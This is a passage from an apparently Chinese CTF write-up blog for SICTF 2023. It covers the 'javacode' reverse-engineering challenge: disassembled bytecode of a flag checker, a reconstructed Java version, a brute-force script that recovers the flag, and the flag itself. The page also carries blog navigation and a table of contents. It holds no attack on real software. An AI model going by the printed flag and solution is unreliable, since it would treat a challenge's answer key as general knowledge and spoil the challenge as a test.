class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line">public static void main(java.lang.String[]);</span><br><span class="line">Code:</span><br><span class="line">    0: bipush        37</span><br><span class="line">    2: newarray       double</span><br><span class="line">    4: dup</span><br><span class="line">    5: iconst_0</span><br><span class="line">    6: ldc2_w        #2                  // double 148.0d</span><br><span class="line">    9: dastore</span><br><span class="line">    10: dup</span><br><span class="line">    11: iconst_1</span><br><span class="line">    12: ldc2_w        #4                  // double 136.0d</span><br><span class="line">    15: dastore</span><br><span class="line">    16: dup</span><br><span class="line">    17: iconst_2</span><br><span class="line">    18: ldc2_w        #6                  // double 151.0d</span><br><span class="line">    21: dastore</span><br><span class="line">    22: dup</span><br><span class="line">    23: iconst_3</span><br><span class="line">    24: ldc2_w        #8                  // double 234.0d</span><br><span class="line">    27: dastore</span><br><span class="line">    28: dup</span><br><span class="line">    29: iconst_4</span><br><span class="line">    30: ldc2_w        #10                 // double 177.0d</span><br><span class="line">    33: dastore</span><br><span class="line">    34: dup</span><br><span class="line">    35: iconst_5</span><br><span class="line">    36: ldc2_w        #12                 // double 48.0d</span><br><span class="line">    39: dastore</span><br><span class="line">    40: dup</span><br><span class="line">    41: bipush        6</span><br><span class="line">    43: ldc2_w        #14                 // double 226.0d</span><br><span class="line">    46: dastore</span><br><span class="line">    47: dup</span><br><span class="line">    48: bipush        7</span><br><span class="line">    50: ldc2_w        #8                  // double 234.0d</span><br><span class="line">    53: dastore</span><br><span class="line">    54: dup</span><br><span class="line">    55: bipush        8</span><br><span class="line">    57: ldc2_w        #16                 // double 214.0d</span><br><span class="line">    60: dastore</span><br><span class="line">    61: dup</span><br><span class="line">    62: bipush        9</span><br><span class="line">    64: ldc2_w        #10                 // double 177.0d</span><br><span class="line">    67: dastore</span><br><span class="line">    68: dup</span><br><span class="line">    69: bipush        10</span><br><span class="line">    71: ldc2_w        #18                 // double 168.0d</span><br><span class="line">    74: dastore</span><br><span class="line">    75: dup</span><br><span class="line">    76: bipush        11</span><br><span class="line">    78: ldc2_w        #20                 // double 176.0d</span><br><span class="line">    81: dastore</span><br><span class="line">    82: dup</span><br><span class="line">    83: bipush        12</span><br><span class="line">    85: ldc2_w        #6                  // double 151.0d</span><br><span class="line">    88: dastore</span><br><span class="line">    89: dup</span><br><span class="line">    90: bipush        13</span><br><span class="line">    92: ldc2_w        #22                 // double 250.0d</span><br><span class="line">    95: dastore</span><br><span class="line">    96: dup</span><br><span class="line">    97: bipush        14</span><br><span class="line">    99: ldc2_w        #24                 // double 19.0d</span><br><span class="line">    102: dastore</span><br><span class="line">    103: dup</span><br><span class="line">    104: bipush        15</span><br><span class="line">    106: ldc2_w        #26                 // double 20.0d</span><br><span class="line">    109: dastore</span><br><span class="line">    110: dup</span><br><span class="line">    111: bipush        16</span><br><span class="line">    113: ldc2_w        #28                 // double 253.0d</span><br><span class="line">    116: dastore</span><br><span class="line">    117: dup</span><br><span class="line">    118: bipush        17</span><br><span class="line">    120: ldc2_w        #30                 // double 52.0d</span><br><span class="line">    123: dastore</span><br><span class="line">    124: dup</span><br><span class="line">    125: bipush        18</span><br><span class="line">    127: ldc2_w        #32                 // double 72.0d</span><br><span class="line">    130: dastore</span><br><span class="line">    131: dup</span><br><span class="line">    132: bipush        19</span><br><span class="line">    134: ldc2_w        #20                 // double 176.0d</span><br><span class="line">    137: dastore</span><br><span class="line">    138: dup</span><br><span class="line">    139: bipush        20</span><br><span class="line">    141: ldc2_w        #34                 // double 170.0d</span><br><span class="line">    144: dastore</span><br><span class="line">    145: dup</span><br><span class="line">    146: bipush        21</span><br><span class="line">    148: ldc2_w        #36                 // double 140.0d</span><br><span class="line">    151: dastore</span><br><span class="line">    152: dup</span><br><span class="line">    153: bipush        22</span><br><span class="line">    155: ldc2_w        #20                 // double 176.0d</span><br><span class="line">    158: dastore</span><br><span class="line">    159: dup</span><br><span class="line">    160: bipush        23</span><br><span class="line">    162: ldc2_w        #38                 // double 236.0d</span><br><span class="line">    165: dastore</span><br><span class="line">    166: dup</span><br><span class="line">    167: bipush        24</span><br><span class="line">    169: ldc2_w        #40                 // double 54.0d</span><br><span class="line">    172: dastore</span><br><span class="line">    173: dup</span><br><span class="line">    174: bipush        25</span><br><span class="line">    176: ldc2_w        #42                 // double 231.0d</span><br><span class="line">    179: dastore</span><br><span class="line">    180: dup</span><br><span class="line">    181: bipush        26</span><br><span class="line">    183: ldc2_w        #44                 // double 212.0d</span><br><span class="line">    186: dastore</span><br><span class="line">    187: dup</span><br><span class="line">    188: bipush        27</span><br><span class="line">    190: ldc2_w        #46                 // double 237.0d</span><br><span class="line">    193: dastore</span><br><span class="line">    194: dup</span><br><span class="line">    195: bipush        28</span><br><span class="line">    197: ldc2_w        #48                 // double 135.0d</span><br><span class="line">    200: dastore</span><br><span class="line">    201: dup</span><br><span class="line">    202: bipush        29</span><br><span class="line">    204: ldc2_w        #6                  // double 151.0d</span><br><span class="line">    207: dastore</span><br><span class="line">    208: dup</span><br><span class="line">    209: bipush        30</span><br><span class="line">    211: ldc2_w        #50                 // double 150.0d</span><br><span class="line">    214: dastore</span><br><span class="line">    215: dup</span><br><span class="line">    216: bipush        31</span><br><span class="line">    218: ldc2_w        #48                 // double 135.0d</span><br><span class="line">    221: dastore</span><br><span class="line">    222: dup</span><br><span class="line">    223: bipush        32</span><br><span class="line">    225: ldc2_w        #52                 // double 217.0d</span><br><span class="line">    228: dastore</span><br><span class="line">    229: dup</span><br><span class="line">    230: bipush        33</span><br><span class="line">    232: ldc2_w        #42                 // double 231.0d</span><br><span class="line">    235: dastore</span><br><span class="line">    236: dup</span><br><span class="line">    237: bipush        34</span><br><span class="line">    239: ldc2_w        #54                 // double 229.0d</span><br><span class="line">    242: dastore</span><br><span class="line">    243: dup</span><br><span class="line">    244: bipush        35</span><br><span class="line">    246: ldc2_w        #56                 // double 32.0d</span><br><span class="line">    249: dastore</span><br><span class="line">    250: dup</span><br><span class="line">    251: bipush        36</span><br><span class="line">    253: ldc2_w        #58                 // double 90.0d</span><br><span class="line">    256: dastore</span><br><span class="line">    257: astore_3</span><br><span class="line">    258: aload_3</span><br><span class="line">    259: arraylength</span><br><span class="line">    260: newarray       double</span><br><span class="line">    262: astore        4</span><br><span class="line">    264: ldc           #60                 // String SICTF2023</span><br><span class="line">    266: astore_1</span><br><span class="line">    267: new           #61                 // class java/util/Scanner</span><br><span class="line">    270: dup</span><br><span class="line">    271: getstatic     #62                 // Field java/lang/System.in:Ljava/io/InputStream;</span><br><span class="line">    274: invokespecial #63                 // Method java/util/Scanner.&quot;&lt;init&gt;&quot;:(Ljava/io/InputStream;)V</span><br><span class="line">    277: astore        5</span><br><span class="line">    279: getstatic     #64                 // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">    282: ldc           #65                 // String 请输入flag:</span><br><span class="line">    284: invokevirtual #66                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">    287: aload         5</span><br><span class="line">    289: invokevirtual #67                 // Method java/util/Scanner.nextLine:()Ljava/lang/String;</span><br><span class="line">    292: astore_2</span><br><span class="line">    293: aload_2</span><br><span class="line">    294: invokevirtual #68                 // Method java/lang/String.toCharArray:()[C</span><br><span class="line">    297: astore        6</span><br><span class="line">    299: aload_2</span><br><span class="line">    300: invokevirtual #69                 // Method java/lang/String.length:()I</span><br><span class="line">    303: bipush        38</span><br><span class="line">    305: if_icmpeq     319</span><br><span class="line">    308: getstatic     #64                 // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">    311: ldc           #70                 // String flag length error\n</span><br><span class="line">    313: invokevirtual #66                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">    316: goto          408</span><br><span class="line">    319: iconst_0</span><br><span class="line">    320: istore        7</span><br><span class="line">    322: iload         7</span><br><span class="line">    324: aload         6</span><br><span class="line">    326: arraylength</span><br><span class="line">    327: iconst_1</span><br><span class="line">    328: isub</span><br><span class="line">    329: if_icmpge     380</span><br><span class="line">    332: aload_1</span><br><span class="line">    333: iload         7</span><br><span class="line">    335: aload_1</span><br><span class="line">    336: invokevirtual #69                 // Method java/lang/String.length:()I</span><br><span class="line">    339: irem</span><br><span class="line">    340: invokevirtual #71                 // Method java/lang/String.charAt:(I)C</span><br><span class="line">    343: istore        8</span><br><span class="line">    345: aload         4        //double array  </span><br><span class="line">    347: iload         7        //0</span><br><span class="line">    349: aload         6        //Method java/lang/String.toCharArray:()[C</span><br><span class="line">    351: iload         7        //0</span><br><span class="line">    353: caload     //flagChars[iload 7]</span><br><span class="line">    354: aload         6        //</span><br><span class="line">    356: iload         7</span><br><span class="line">    358: iconst_1</span><br><span class="line">    359: iadd       //flagChars[iload 7 +1]</span><br><span class="line">    360: caload     </span><br><span class="line">    361: ixor       </span><br><span class="line">    362: iload         8        </span><br><span class="line">    364: isub</span><br><span class="line">    365: iload         8</span><br><span class="line">    367: ixor</span><br><span class="line">    368: sipush        255</span><br><span class="line">    371: iand</span><br><span class="line">    372: i2d</span><br><span class="line">    373: dastore</span><br><span class="line">    374: iinc          7, 1</span><br><span class="line">    377: goto          322</span><br><span class="line">    380: aload         4</span><br><span class="line">    382: aload_3</span><br><span class="line">    383: invokestatic  #72                 // Method java/util/Arrays.equals:([D[D)Z</span><br><span class="line">    386: ifeq          400</span><br><span class="line">    389: getstatic     #64                 // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">    392: ldc           #73                 // String OH!You are right!\n</span><br><span class="line">    394: invokevirtual #66                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">    397: goto          408</span><br><span class="line">    400: getstatic     #64                 // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">    403: ldc           #74                 // String NO!You should try again!\n</span><br><span class="line">    405: invokevirtual #66                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">    408: iconst_0</span><br><span class="line">    409: invokestatic  #75                 // Method java/lang/System.exit:(I)V</span><br><span class="line">    412: return</span><br></pre></td></tr></table></figure>

<p>原java(其中double位运算比较麻烦全给我改成int了)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int[] array = &#123;148, 136, 151, 234, 177, 48, 226, 234, 214, 177, 168, 176, 151, 250,</span><br><span class="line">                19, 20, 253, 52, 72, 176, 170, 140, 176, 236, 54, 231, 212, 237, 135,</span><br><span class="line">                151, 150, 135, 217, 231, 229, 32, 90&#125;;</span><br><span class="line">        </span><br><span class="line">        int[] inputArray = new int[array.length];</span><br><span class="line">        </span><br><span class="line">        String inputString = &quot;SICTF2023&quot;;</span><br><span class="line">        // java.util.Scanner scanner = new java.util.Scanner(System.in);</span><br><span class="line">        </span><br><span class="line">        // System.out.println(&quot;请输入flag:&quot;);</span><br><span class="line">        // String flag = scanner.nextLine();</span><br><span class="line">        </span><br><span class="line">        char[] flagChars = &quot;SICTF&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!&#125;&quot;.toCharArray();//9~35</span><br><span class="line">        int now=35;</span><br><span class="line">        // for (int j=128;j&gt;0;j--)</span><br><span class="line">        // &#123;</span><br><span class="line">        // if(now&gt;37)</span><br><span class="line">        // &#123;</span><br><span class="line">        //     System.out.println(new String(flagChars));</span><br><span class="line">        //     break;</span><br><span class="line">        // &#125;</span><br><span class="line">        // flagChars[now]=(char)j;</span><br><span class="line">        // for (int i = now-1; i &lt; flagChars.length - 1; i++) &#123;</span><br><span class="line">        //     int value = (int)inputString.charAt(i % inputString.length());</span><br><span class="line">        //     inputArray[i] =(((flagChars[i] ^ flagChars[i + 1] )-value )^(value))&amp;0xff;</span><br><span class="line">        //     if(inputArray[i]==array[i])</span><br><span class="line">        //     &#123;</span><br><span class="line">        //         now++;</span><br><span class="line">        //         j=128;</span><br><span class="line">        //         break;</span><br><span class="line"></span><br><span class="line">        //     &#125;</span><br><span class="line">        // &#125;</span><br><span class="line">        // &#125; </span><br><span class="line">        for (int j=30;j&lt;127;j++)</span><br><span class="line">        &#123;</span><br><span class="line">        if(now&lt;0)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(new String(flagChars));</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        flagChars[now]=(char)j;</span><br><span class="line">            int value = (int)inputString.charAt(now % inputString.length());</span><br><span class="line">            inputArray[now] =(((flagChars[now] ^ flagChars[now + 1] )-value )^(value)) &amp; 0xFF;</span><br><span class="line">            if(inputArray[now]==array[now]&amp;&amp;flagChars[now]!=30)</span><br><span class="line">            &#123;</span><br><span class="line">                now--;</span><br><span class="line">                j=0;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为有”SICTF{“在前面 “}”在后面所以写了个爆破版本来获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        int[] array = &#123;148, 136, 151, 234, 177, 48, 226, 234, 214, 177, 168, 176, 151, 250,</span><br><span class="line">                19, 20, 253, 52, 72, 176, 170, 140, 176, 236, 54, 231, 212, 237, 135,</span><br><span class="line">                151, 150, 135, 217, 231, 229, 32, 90&#125;;</span><br><span class="line">        </span><br><span class="line">        int[] inputArray = new int[array.length];</span><br><span class="line">        </span><br><span class="line">        String inputString = &quot;SICTF2023&quot;;</span><br><span class="line">        // java.util.Scanner scanner = new java.util.Scanner(System.in);</span><br><span class="line">        </span><br><span class="line">        // System.out.println(&quot;请输入flag:&quot;);</span><br><span class="line">        // String flag = scanner.nextLine();</span><br><span class="line">        </span><br><span class="line">        char[] flagChars = &quot;SICTF&#123;OMGaaaaaaaaaaaaaaaaaaaaaaaaaaa!&#125;&quot;.toCharArray();//9~35,之前脚本没写好只爆了</span><br><span class="line">        int now=35;</span><br><span class="line">        // for (int j=128;j&gt;0;j--)</span><br><span class="line">        // &#123;</span><br><span class="line">        // if(now&gt;37)</span><br><span class="line">        // &#123;</span><br><span class="line">        //     System.out.println(new String(flagChars));</span><br><span class="line">        //     break;</span><br><span class="line">        // &#125;</span><br><span class="line">        // flagChars[now]=(char)j;</span><br><span class="line">        // for (int i = now-1; i &lt; flagChars.length - 1; i++) &#123;</span><br><span class="line">        //     int value = (int)inputString.charAt(i % inputString.length());</span><br><span class="line">        //     inputArray[i] =(((flagChars[i] ^ flagChars[i + 1] )-value )^(value))&amp;0xff;</span><br><span class="line">        //     if(inputArray[i]==array[i])</span><br><span class="line">        //     &#123;</span><br><span class="line">        //         now++;</span><br><span class="line">        //         j=128;</span><br><span class="line">        //         break;</span><br><span class="line"></span><br><span class="line">        //     &#125;</span><br><span class="line">        // &#125;</span><br><span class="line">        // &#125; </span><br><span class="line">        for (int j=30;j&lt;127;j++)</span><br><span class="line">        &#123;</span><br><span class="line">        if(now&lt;0)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(new String(flagChars));</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        flagChars[now]=(char)j;</span><br><span class="line">            int value = (int)inputString.charAt(now % inputString.length());</span><br><span class="line">            inputArray[now] =(((flagChars[now] ^ flagChars[now + 1] )-value )^(value)) &amp; 0xFF;</span><br><span class="line">            if(inputArray[now]==array[now]&amp;&amp;flagChars[now]!=30)</span><br><span class="line">            &#123;</span><br><span class="line">                now--;</span><br><span class="line">                j=0;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SICTF{OMG_j@vac0de_1s_sO_interesting!}</p>
<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/08/22/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"> Hessian反序列化</a></p>
<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/09/28/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">常见webshell流量分析 </a></p>
<p>© 2024 ycxlo</p>
<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/09/07/java-cc%E9%93%BE7/" rel="prev" title="java_cc链7">
      <i class="fa fa-chevron-left"></i> java_cc链7
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/10/05/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="next" title="常见webshell流量分析">
      常见webshell流量分析 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E8%83%BD%E8%B7%9F%E5%BE%97%E4%B8%8A%E6%88%91%E7%9A%84speed%E5%90%97"><span class="nav-number">1.1.</span> <span class="nav-text">你能跟得上我的speed吗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pain"><span class="nav-number">1.2.</span> <span class="nav-text">pain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0-Include"><span class="nav-number">1.3.</span> <span class="nav-text">[签到]Include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-PHP"><span class="nav-number">1.4.</span> <span class="nav-text">Baby_PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E5%85%A8%E9%83%BD%E8%A6%81"><span class="nav-number">1.5.</span> <span class="nav-text">我全都要</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE"><span class="nav-number">1.6.</span> <span class="nav-text">RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DoyouknowCC"><span class="nav-number">1.7.</span> <span class="nav-text">DoyouknowCC</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Forensics"><span class="nav-number">2.</span> <span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9D%E5%A1%94%E9%95%87%E6%B2%B3%E5%A6%96"><span class="nav-number">2.1.</span> <span class="nav-text">宝塔镇河妖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%A9%E6%A1%A5"><span class="nav-number">2.2.</span> <span class="nav-text">天桥</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BE%8E%E5%A5%B3%E5%A7%90%E5%A7%90"><span class="nav-number">2.3.</span> <span class="nav-text">美女姐姐</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B4%AD%E7%89%A9%E4%B9%8B%E6%97%85"><span class="nav-number">2.4.</span> <span class="nav-text">购物之旅</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">3.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0-Shop"><span class="nav-number">3.1.</span> <span class="nav-text">[签到]Shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Different-gadget"><span class="nav-number">3.2.</span> <span class="nav-text">Different_gadget</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0-%E5%8F%A4%E5%85%B8%E5%A4%A7%E6%9D%82%E7%83%A9"><span class="nav-number">4.1.</span> <span class="nav-text">[签到]古典大杂烩</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Radio"><span class="nav-number">4.2.</span> <span class="nav-text">Radio</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MingTianPao"><span class="nav-number">4.3.</span> <span class="nav-text">MingTianPao</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#small-e"><span class="nav-number">4.4.</span> <span class="nav-text">small_e</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">5.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fast-morse"><span class="nav-number">5.1.</span> <span class="nav-text">fast_morse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QR-QR-QR"><span class="nav-number">5.2.</span> <span class="nav-text">QR_QR_QR</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Re"><span class="nav-number">6.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pyc"><span class="nav-number">6.1.</span> <span class="nav-text">pyc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Myobject"><span class="nav-number">6.2.</span> <span class="nav-text">Myobject</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cnbase"><span class="nav-number">6.3.</span> <span class="nav-text">cnbase</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84base64"><span class="nav-number">6.4.</span> <span class="nav-text">不一样的base64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#javacode"><span class="nav-number">6.5.</span> <span class="nav-text">javacode</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">59</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
